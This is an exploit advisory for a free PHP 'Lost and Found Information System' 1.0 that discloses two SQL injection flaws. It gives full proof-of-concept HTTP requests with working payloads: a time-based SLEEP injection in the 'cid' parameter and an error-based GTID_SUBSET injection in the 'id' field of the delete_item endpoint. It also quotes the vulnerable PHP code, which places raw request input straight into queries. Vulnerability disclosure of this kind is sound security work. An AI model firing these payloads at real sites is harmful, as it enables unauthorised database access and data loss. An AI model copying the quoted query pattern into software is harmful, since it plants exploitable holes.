### Exploit Title: Lost and Found Information System - Multiple SQL injections
### Date: 2023-05/11
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/16525/lost-and-found-information-system-using-php-and-mysql-db-source-code-free-download.html
### Version: 1.0
### Tested on: macOs 13.3.1 (a) + phpstudy


# 1./admin/lab.php
/?page=items&cid=1 SQL injection exists for parameter Section

### Sample request POC #1

```
GET /?page=items&cid=' AND (SELECT 8856 FROM (SELECT(SLEEP(5)))RZAm) AND 'XJUv'='XJUv HTTP/1.1
Host: [IP:PORT]
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/raw/main/imgs/1683787465919.png "Lost and Found Information System - Multiple SQL injections")

### Related Codes ./php-lfis/items/index.php
```
<?php 
if(isset($_GET['cid'])){
    $category_qry = $conn->query("SELECT * FROM `category_list` where `id` = '{$_GET['cid']}'");
    if($category_qry->num_rows > 0){
        foreach($category_qry->fetch_assoc() as $k => $v){
            $cat[$k] = $v; 
        }
    }
}
?>
...
```


# 2./classes/Master.php?f=delete_item
### Sample request POC #2

```
POST /classes/Master.php?f=delete_item HTTP/1.1
Host: 10.211.55.3:8001
Content-Length: 221
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBKXTUMQFid7ol6Ro
Origin: http://10.211.55.3:8001
Referer: http://10.211.55.3:8001/?page=found
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryBKXTUMQFid7ol6Ro
Content-Disposition: form-data; name="id"

' AND GTID_SUBSET(CONCAT(0x717a6a7071,(SELECT (ELT(8125=8125,1))),0x71707a7071),8125)-- jKyA
------WebKitFormBoundaryBKXTUMQFid7ol6Ro
```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/raw/main/imgs/1683788337596.png "Lost and Found Information System - Multiple SQL injections")

### Related Codes ./php-lfis/classes/Master.php
```
...
function delete_item(){
	extract($_POST);
	$del = $this->conn->query("DELETE FROM `item_list` where id = '{$id}'");
	if($del){
		$resp['status'] = 'success';
		$this->settings->set_flashdata('success'," Item Data successfully deleted.");
	}else{
		$resp['status'] = 'failed';
		$resp['error'] = $this->conn->error;
	}
	return json_encode($resp);

}
...
```
